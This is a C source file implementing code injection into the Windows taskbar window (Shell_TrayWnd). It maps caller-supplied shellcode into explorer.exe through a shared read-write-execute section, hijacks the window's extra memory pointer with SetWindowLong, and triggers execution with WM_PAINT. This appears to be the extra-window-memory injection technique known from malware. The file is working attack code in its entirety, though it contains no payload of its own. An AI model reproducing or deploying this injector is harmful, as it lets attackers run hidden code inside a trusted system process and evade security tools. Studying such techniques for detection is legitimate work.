#include "window_long_inject.h"

#include <stdio.h>

//for injection into Shell_TrayWnd
PVOID map_code_and_addresses_into_process(HANDLE hProcess, LPBYTE shellcode, SIZE_T shellcodeSize)
{
    HANDLE hSection = NULL;
    OBJECT_ATTRIBUTES hAttributes;
    memset(&hAttributes, 0, sizeof(OBJECT_ATTRIBUTES));

    LARGE_INTEGER maxSize;
    maxSize.HighPart = 0;
    maxSize.LowPart = sizeof(LONG) * 2 + shellcodeSize; //we need space for the shellcode and two pointers
    NTSTATUS status = NULL;
    if ((status = ZwCreateSection( &hSection, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != STATUS_SUCCESS)
    {
        printf("[ERROR] ZwCreateSection failed, status : %x\n", status);
        return NULL;
    }

    PVOID sectionBaseAddress = NULL;
    ULONG viewSize = 0;
    SECTION_INHERIT inheritDisposition = ViewShare; //VIEW_SHARE

    // map the section in context of current process:
    if ((status = NtMapViewOfSection(hSection, GetCurrentProcess(), &sectionBaseAddress, NULL, NULL, NULL, &viewSize, inheritDisposition, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
    {
        printf("[ERROR] NtMapViewOfSection failed, status : %x\n", status);
        return NULL;
    }
    printf("Section BaseAddress: %p\n", sectionBaseAddress);

    //map the new section into context of opened process
    PVOID sectionBaseAddress2 = NULL;
    if ((status = NtMapViewOfSection(hSection, hProcess, &sectionBaseAddress2, NULL, NULL, NULL, &viewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
    {
        printf("[ERROR] NtMapViewOfSection failed, status : %x\n", status);
        return NULL;
    }

    LPVOID shellcode_remote_ptr = sectionBaseAddress2;
    LPVOID shellcode_local_ptr = sectionBaseAddress;

    //the same page have double mapping - remote and local, so local modifications are reflected remotely
    memcpy (shellcode_local_ptr, shellcode, shellcodeSize);
    printf("Shellcode copied!\n");

    LPVOID handles_remote_ptr = (BYTE*) shellcode_remote_ptr + shellcodeSize;
    LPVOID handles_local_ptr = (BYTE*) shellcode_local_ptr + shellcodeSize;

    //store the remote addresses
    PVOID buf_va = (BYTE*) handles_remote_ptr;
    LONG hop1 = (LONG) buf_va + sizeof(LONG);
    LONG shellc_va = (LONG) shellcode_remote_ptr;

    //fill the pointers
    memcpy((BYTE*)handles_local_ptr, &hop1, sizeof(LONG));
    memcpy((BYTE*)handles_local_ptr + sizeof(LONG), &shellc_va, sizeof(LONG));

    //unmap from the context of current process
    ZwUnmapViewOfSection(GetCurrentProcess(), sectionBaseAddress);
    ZwClose(hSection);

    printf("Section mapped at address: %p\n", sectionBaseAddress2);
    return shellcode_remote_ptr;
}

bool inject_into_tray(LPBYTE shellcode, SIZE_T shellcodeSize)
{
    HWND hWnd = FindWindow(L"Shell_TrayWnd", NULL);
    if (hWnd == NULL) return false;

    DWORD pid = 0;
    GetWindowThreadProcessId(hWnd, &pid);
    printf("PID:\t%d\n", pid);
   //save the current value, because we will need to recover it:
    LONG winLong = GetWindowLongW(hWnd, 0);
    printf("WindowLong:\t%lx\n", winLong);

    HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, false, pid);
    if (hProcess == NULL) {
        return false;
    }

    LPVOID remote_shellcode_ptr = map_code_and_addresses_into_process(hProcess, shellcode, shellcodeSize);
    if (remote_shellcode_ptr == NULL) {
        return false;
    }
    LPVOID remote_handles_ptr = (BYTE*) remote_shellcode_ptr + shellcodeSize;
    
    printf("Saving handles to:\t%p\n", remote_handles_ptr);

    //set the handle to the injected:
    SetWindowLong(hWnd, 0, (LONG) remote_handles_ptr);

    //send signal to execute the injected code
    SendNotifyMessage(hWnd, WM_PAINT, 0, 0);

    //procedure will be triggered on every message
    //in order to avoid repetitions, injected code should restore the previous value after the first exection
    //here we are checking if it is done
    size_t max_wait = 5;
    while (GetWindowLong(hWnd, 0) != winLong) {
        //not restored, wait more
        Sleep(100);
        if ((max_wait--) == 0) {
            //don't wait longer, restore by yourself
            SetWindowLong(hWnd, 0, winLong);
            SendNotifyMessage(hWnd, WM_PAINT, 0, 0);
        }
    }    
    CloseHandle(hProcess);
    return true;
}